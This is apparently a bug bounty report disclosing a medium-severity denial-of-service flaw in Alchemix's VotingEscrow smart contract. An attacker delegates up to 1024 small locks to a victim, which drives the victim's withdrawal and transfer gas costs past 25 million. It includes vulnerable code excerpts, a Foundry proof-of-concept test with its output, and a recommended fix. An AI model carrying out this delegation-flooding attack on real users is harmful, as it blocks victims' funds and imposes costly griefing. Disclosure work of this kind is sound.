# 31413 - \[SC - Medium] DOS attack by delegating tokens at MAX\_DELEGATES

Submitted on May 18th 2024 at 20:04:09 UTC by @savi0ur for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31413

Report type: Smart Contract

Report severity: Medium

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/VotingEscrow.sol>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
* Block stuffing

## Description

## Bug Description

Any user can delegate the balance of the locked veALCX NFT token amount to anyone by calling `delegate()`. <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L1103-L1130>

```solidity
function _moveAllDelegates(address owner, address src, address dst) internal {
    // You can only redelegate what you own
    if (src != dst) {
        if (src != address(0)) {
            // ...SNIP...
        }

        if (dst != address(0)) {
            uint32 dstCheckpoints = numCheckpoints[dst];
            uint256[] memory dstTokensOld = dstCheckpoints > 0
                ? checkpoints[dst][dstCheckpoints - 1].tokenIds
                : checkpoints[dst][0].tokenIds;

            uint256 ownerTokenCount = ownerToTokenCount[owner];
            require(dstTokensOld.length + ownerTokenCount <= MAX_DELEGATES, "dst would have too many tokenIds"); //@audit DoS

            // Create a new array of tokenIds, with the owner's tokens added
            uint256[] memory dstTokensNew = new uint256[](dstTokensOld.length + ownerTokenCount);

            // Copy array
            for (uint256 i = 0; i < dstTokensOld.length; i++) {
                dstTokensNew[i] = dstTokensOld[i];
            }

            // Plus all that's owned
            for (uint256 i = 0; i < ownerTokenCount; i++) {
                uint256 tId = ownerToTokenIdList[owner][i];
                dstTokensNew[dstTokensOld.length + i] = tId;
            }

            // Find the index of the checkpoint to create or update
            uint32 dstIndex = _findWhatCheckpointToWrite(dst);

            // dst has a new or updated checkpoint with the _tokenId added
            checkpoints[dst][dstIndex] = Checkpoint({ timestamp: block.timestamp, tokenIds: dstTokensNew }); // <==

            // Add to numCheckpoints if the last checkpoint is different from the current block timestamp
            if (dstCheckpoints == 0 || checkpoints[dst][dstCheckpoints - 1].timestamp != block.timestamp) {
                numCheckpoints[dst] = dstCheckpoints + 1;
            }
        }
    }
}
```

<https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L1033-L1052>

```solidity
function _moveTokenDelegates(address src, address dst, uint256 _tokenId) internal {
    if (src != dst && _tokenId > 0) {
        // If the source is not the zero address, we decrement the number of tokenIds
        if (src != address(0)) {
            // ...SNIP...
        }

        // If the destination is not the zero address, we increment the number of tokenIds
        if (dst != address(0)) {
            uint32 dstCheckpoints = numCheckpoints[dst];
            uint256[] memory dstTokensOld = dstCheckpoints > 0
                ? checkpoints[dst][dstCheckpoints - 1].tokenIds
                : checkpoints[dst][0].tokenIds;
            uint256[] memory dstTokensNew = new uint256[](dstTokensOld.length + 1);

            require(dstTokensOld.length + 1 <= MAX_DELEGATES, "dst would have too many tokenIds"); //@audit DoS

            // Copy array plus _tokenId
            for (uint256 i = 0; i < dstTokensOld.length; i++) {
                dstTokensNew[i] = dstTokensOld[i];
            }
            dstTokensNew[dstTokensNew.length - 1] = _tokenId;

            // Find the index of the checkpoint to create or update
            uint32 dstIndex = _findWhatCheckpointToWrite(dst);

            // dst has a new or updated checkpoint with the _tokenId added
            checkpoints[dst][dstIndex] = Checkpoint({ timestamp: block.timestamp, tokenIds: dstTokensNew }); // <==

            // Add to numCheckpoints if the last checkpoint is different from the current block timestamp
            if (dstCheckpoints == 0 || checkpoints[dst][dstCheckpoints - 1].timestamp != block.timestamp) {
                numCheckpoints[dst] = dstCheckpoints + 1;
            }
        }
    }
}
```

As the delegated tokens are maintained in an array that's vulnerable to DOS attack, the `VotingEscrow` contract has a safety check of `MAX_DELEGATES = 1024` preventing an address from having a huge array. <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L33-L34>

```solidity
/// @notice Maximum number of delegates a token can have
uint256 public constant MAX_DELEGATES = 1024; // avoid too much gas
```

Given the current implementation, any user with 1024 delegated tokens takes more than 25M gas to `transfer/delegate/burn/mint` a token as shown in PoC. It will consume a lot of gas as its using function like `_moveTokenDelegates()` and `_moveAllDelegates()`, which are vulnerable to DoS attack when `MAX_DELEGATES` limit is reached for delegated tokens. However, the current gas limit of the ETH chain is 30M. (ref: [Etherscan](https://etherscan.io/block/19881987)).

This functions(`_moveTokenDelegates()` and `_moveAllDelegates()`) from `VotingEscrow` are called in following functions, which makes them vulnerable to DoS.

* `delegate()`
* `safeTransferFrom()`
* `transferFrom()`
* `merge()`
* `withdraw()`

As we can see in a PoC for a single withdrawal tx, its very expensive for a user as it cost more than 25M gas for a victim.

Current cost of the tx for around 25M gas is around $1000, calculated as follow:

```
TxCostInUSD = 25e6(gasConsumed) * 14e9(CurrentCostInGWEI) / 1e18 * 3116.44(ETHPriceInUSD)
			= 1090.754 USD 
```

This cost will be even higher when block space in high demand as base fee will increase and also users are willing to offer extra to get a place for their tx in block space.

Tool to find real time gas cost for 25M gas cost: <https://www.cryptoneur.xyz/en/gas-fees-calculator?usedGas=25000000\\&txnType=Custom\\&gasPrice=instant>

Also it will be difficult for a user to get a space in a block space when their tx is consuming almost a gas limit of a block (30M). User's tx will get rejected by builder as its not providing any incentive (apart from tx cost) for a builder to include their tx in a block during high demand of a block space.

If someone trying to attack a victim's address by creating a new address, a new lock, and delegating to the victim. By the time the attacker hit the gas limit, the victim can not withdraw/transfer/delegate transaction in a high demand of a block space.

## Impact

Due to the mentioned attack, multiple users wont be able to withdraw their tokens in the same block space as there is a gas limit of 30M on ethereum for a transaction. Users tx could land when there is less traffic on ethereum, but attacker could do block stuffing for just a 5-6 million gas for the same block to grief user's withdraw transaction.

## Recommendation

Adjust the `MAX_DELEGATES` from 1024 to 128 Or Give an option for users to opt-out/opt-in for a certain delegated tokens. Users will only accept the delegated tokens if they opt-in, or users can opt-out to refuse any uncommissioned delegated tokens.

## References

* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L1033-L1052>
* <https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/VotingEscrow.sol#L1103-L1130>

## Proof Of Concept

**Steps to Run using Foundry:**

* Paste following foundry code in `src/test/VotingEscrow.t.sol`
* Run using `FOUNDRY_PROFILE=default forge test --fork-url $FORK_URL --fork-block-number 17133822 --match-contract VotingEscrowTest --match-test testDelegateLimitAttack -vv`

```solidity
function testDelegateLimitAttack() public {
    // Give some tokens to this contract
    hevm.startPrank(address(admin));
    IERC20(bpt).transfer(address(this), TOKEN_1M);
    hevm.stopPrank();

    // Give full approval to voting escrow
    IERC20(bpt).approve(address(veALCX), type(uint256).max);

    uint EPOCH = veALCX.EPOCH();

    uint tokenId = veALCX.createLock(TOKEN_1, EPOCH, false);

    for(uint256 i = 0; i < veALCX.MAX_DELEGATES() - 1; i++) {
        hevm.roll(block.number + 1);
        hevm.warp(block.timestamp + 12);
        
        address fakeAccount = address(uint160(block.timestamp + i));
        IERC20(bpt).transfer(fakeAccount, 1);

        hevm.startPrank(fakeAccount);
        IERC20(bpt).approve(address(veALCX), type(uint256).max);
        veALCX.createLock(1, MAXTIME, true);
        veALCX.delegate(address(this));
        hevm.stopPrank();
    }
    
    hevm.roll(block.number + 1);
    hevm.warp(block.timestamp + EPOCH);
    veALCX.startCooldown(tokenId);

    hevm.roll(block.number + 1);
    hevm.warp(block.timestamp + EPOCH);

    uint initialGas = gasleft();
    veALCX.withdraw(tokenId);
    uint gasUsed = initialGas - gasleft();
    
    console.log("Gas Used in total: ", gasUsed);
    assertGt(gasUsed, 25_000_000);
}
```

**Console Output:**

```shell
> FOUNDRY_PROFILE=default forge test --fork-url $FORK_URL --fork-block-number 17133822 --match-contract VotingEscrowTest --match-test testDelegateLimitAttack -vv

[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/VotingEscrow.t.sol:VotingEscrowTest
[PASS] testDelegateLimitAttack() (gas: 12532053553)
Logs:
  Gas Used in total:  25795537
```
